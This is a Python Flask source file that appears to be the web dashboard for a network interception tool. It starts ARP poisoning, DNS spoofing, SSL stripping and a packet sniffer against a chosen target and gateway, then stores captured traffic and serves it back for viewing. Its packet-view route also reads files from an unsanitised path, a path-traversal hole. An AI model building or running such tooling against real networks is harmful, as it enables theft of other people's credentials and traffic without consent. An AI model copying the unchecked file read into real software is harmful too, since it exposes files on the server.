from flask import Flask, render_template, jsonify, request, Response
import threading
from core import STATUS, STOP_EVENT, CAPTURE_DIR
from core.arp import run_attack_loop
from core.ssl_strip import run_ssl_strip
from core.dns import start_dns_spoofing 
from core.sniffer import start_sniffer
from core.scanner import scan_network  

def create_app():
    app = Flask(__name__)
    threads = {'attack': None, 'sniffer': None, 'ssl': None, 'dns': None}

    @app.route('/')
    def index(): return render_template('index.html', data=STATUS)

    @app.route('/action', methods=['POST'])
    def action():
        req = request.json
        act = req.get('action')

        if act == 'clear_logs':
            STATUS["logs"] = [] 
            return jsonify({"status": "cleared"})
        if act == 'clear_data':
            STATUS["intercepted_data"] = []
            return jsonify({"status": "cleared"})
        if act == 'stop':
            STOP_EVENT.set()
            return jsonify({"status": "stopped"})

        if 'start' in act:
            STOP_EVENT.clear()
            STATUS["target"] = req.get('target')
            STATUS["gateway"] = req.get('gateway')
            STATUS["interface"] = req.get('interface')
            STATUS["dns_domain"] = req.get('dns_domain')
            STATUS["dns_ip"] = req.get('dns_ip')
            
            # Start Sniffer (Common to all)
            if not threads['sniffer'] or not threads['sniffer'].is_alive():
                threads['sniffer'] = threading.Thread(target=start_sniffer, daemon=True)
                threads['sniffer'].start()

            # --- MODE SELECTION ---
            passive_mode = False

            if act == 'start_silent':
                STATUS["mode"] = "SILENT"
                passive_mode = True 
                # Silent Mode: We START ARP loop (passive=True) but NO other attacks.

            elif act == 'start_dns':
                STATUS["mode"] = "DNS SPOOF"
                threads['dns'] = threading.Thread(target=start_dns_spoofing, daemon=True)
                threads['dns'].start()

            elif act == 'start_sslstrip':
                STATUS["mode"] = "SSL STRIP"
                threads['ssl'] = threading.Thread(target=run_ssl_strip, daemon=True)
                threads['ssl'].start()

            # Start ARP Loop (Active or Passive based on flag)
            threads['attack'] = threading.Thread(
                target=run_attack_loop, 
                args=(STATUS["target"], STATUS["gateway"], passive_mode), 
                daemon=True
            )
            threads['attack'].start()
            
            return jsonify({"status": "started"})
            
    @app.route('/update')
    def update(): return jsonify(STATUS)

    @app.route('/view/<pkt_id>')
    def view_packet(pkt_id):
        try:
            with open(f"{CAPTURE_DIR}/{pkt_id}.html", "r", encoding="utf-8") as f:
                content = f.read()
            return Response(content, mimetype='text/plain') 
        except: return "File not found."

    @app.route('/scan', methods=['POST'])
    def scan_route():
        interface = request.json.get('interface', 'eth0')
        try:
            # Run the scan
            active_hosts = scan_network(interface)
            return jsonify({"status": "success", "hosts": active_hosts})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})

        
    return app